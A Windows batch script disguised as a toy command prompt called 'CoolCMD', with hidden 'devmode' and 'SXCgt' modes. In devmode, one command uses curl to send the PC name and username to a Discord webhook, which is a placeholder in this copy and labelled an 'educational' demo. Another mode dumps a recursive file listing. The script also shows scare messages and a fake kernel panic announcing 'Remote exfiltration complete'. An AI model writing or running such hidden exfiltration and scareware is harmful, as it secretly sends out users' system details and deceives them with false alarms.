@echo off
setlocal enabledelayedexpansion

:: Set the webhook variable here for your demo
set "WEBHOOK_URL=YOUR_DISCORD_WEBHOOK_HERE"

:prompt_loop
cls
color 07
echo CoolCMD
echo And no, this is not affiliated with the Roblox c00lkid incident.
echo.

:input_top
set /p userInput=CoolCMD: 

:: Navigation Commands
if /I "!userInput!"=="devmode" goto hackerint
if /I "!userInput!"=="exit" exit

:: Shutdown Commands
if /I "!userInput!"=="shutdown -s" shutdown -s
if /I "!userInput!"=="shutdown -r" shutdown -r
if /I "!userInput!"=="shutdown -i" shutdown -i
if /I "!userInput!"=="shutdown -a" shutdown -a
if /I "!userInput!"=="help" (
    echo ALL COMMANDS
    echo help       - You're looking at it
    echo devmode    - Enter Developer/Hacker mode
    echo shutdown -s - Shuts the computer down
    echo shutdown -r - Restarts the computer
    echo exit       - Close CoolCMD
    pause
    goto prompt_loop
)

echo "!userInput!" is not a valid command.
goto input_top

:hackerint
cls
color 0A
echo [DEVELOPER MODE ACTIVE]
:hacker_input
set /p userInput=devmode: 

if /I "!userInput!"=="getserver -r" (
    tree
    DRIVERQUERY
    echo Scanning Vulnerable Servers...
    timeout /t 3 >nul
    color 0C
    echo WARNING: SYSTEM CREDENTIALS EXPOSED.
    echo Sending system manifest to remote server...
    
    :: EDUCATIONAL EXFILTRATION DEMO
    :: This sends the PC name and User to your webhook
    curl -H "Content-Type: application/json" -d "{\"content\":\"**ALERT:** System Info Grabbed\n**PC:** %COMPUTERNAME%\n**User:** %USERNAME%\"}" %WEBHOOK_URL%
    
    pause
    goto hackerint
)

if /I "!userInput!"=="SXCgtlogon" goto SXCgt
if /I "!userInput!"=="exit" goto prompt_loop
goto hacker_input

:SXCgt
cls
color 0B
echo -- SXCgt SECURE SHELL --
:sxc_input
set /p userInput=SXCgtMode: 

if /I "!userInput!"=="destroy cooline" (
    echo Loading...
    tree
    echo Generating debug log...
    dir /b /s > debug_log.txt
    goto kernalpanic
) else (
    color 0C
    echo FATAL ERROR AT 000000XB0242. PLEASE REINSTALL COOLINE
    timeout /t 3 >nul
    goto prompt_loop
)

:kernalpanic
cls
color 0C
echo ========================================
echo           FATAL SYSTEM ERROR
echo ========================================
echo KERNEL_STACK_INPAGE_ERROR (0x00000077)
echo.
echo Remote exfiltration complete.
pause
goto prompt_loop
